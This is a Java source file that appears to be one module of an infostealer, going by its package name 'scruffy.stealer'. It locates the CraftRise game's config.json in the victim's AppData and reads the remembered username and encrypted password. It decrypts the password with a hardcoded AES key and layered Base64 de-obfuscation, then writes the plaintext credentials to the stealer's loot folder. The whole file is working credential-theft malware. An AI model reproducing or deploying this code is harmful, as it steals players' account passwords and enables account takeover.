package scruffy.stealer.impl.game;

import java.io.File;
import java.util.Base64;
import java.util.function.Function;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.xml.bind.DatatypeConverter;

import org.apache.commons.io.FileUtils;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import scruffy.stealer.utils.utilities;

public class craftrise extends utilities {

	public void initialize() throws Exception {
		File file = new File(System.getenv("appdata"), "/.craftrise/config.json");
		if (!file.exists())
			return;

		String str = FileUtils.readFileToString(file, "utf-8");

        JsonObject obj = new JsonParser().parse(str).getAsJsonObject();
        String username = obj.get("rememberName").getAsString();

        String encryptedPassword = obj.get("rememberPass").getAsString();
        String password = Decryptor.AES_ECB_PKCS5.decrypt(encryptedPassword);

		FileUtils.writeStringToFile(new File(getFolder() + "/game/craftrise/acc.txt"), username + ":" + password + "\n", "utf-8", true);
		content.add("craftrise");
	}

	enum Decryptor {

		AES_ECB_PKCS5 {
			@Override
			public String decrypt(String encryptedPassword) {
				Function<String, String> decryptAndRemovePrefix = (str) -> {
					try {
						byte[] key = "2640023187059250".getBytes("utf-8");
						SecretKeySpec secretKeySpec = new SecretKeySpec(key, "AES");
						Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
						cipher.init(Cipher.DECRYPT_MODE, secretKeySpec);
						byte[] decryptedBytes = cipher.doFinal(DatatypeConverter.parseBase64Binary(str));
						return new String(decryptedBytes);
					} catch (Exception e) {
						throw new RuntimeException("Decryption failed", e);
					}
				};

				String decryptedString = decryptAndRemovePrefix.andThen(Decryptor::getRiseVers).andThen(result -> result.split("#")[0]).apply(encryptedPassword);
				return decryptedString;

			}
		};

		private static String getRiseVers(String input) {
			Function<String, String> decryptAndRemovePrefix = (str) -> decryptBase64(str).replace("3ebi2mclmAM7Ao2", "").replace("KweGTngiZOOj9d6", "");
			String decodedString = decryptAndRemovePrefix.andThen(decryptAndRemovePrefix).andThen(Decryptor::decryptBase64).apply(input);
			return decodedString;
		}

		private static String decryptBase64(String input) {
			try {
				return new String(Base64.getDecoder().decode(input), "utf-8");
			} catch (Exception ignored) {
			}
			return null;
		}

		public abstract String decrypt(String encryptedPassword);

	}

}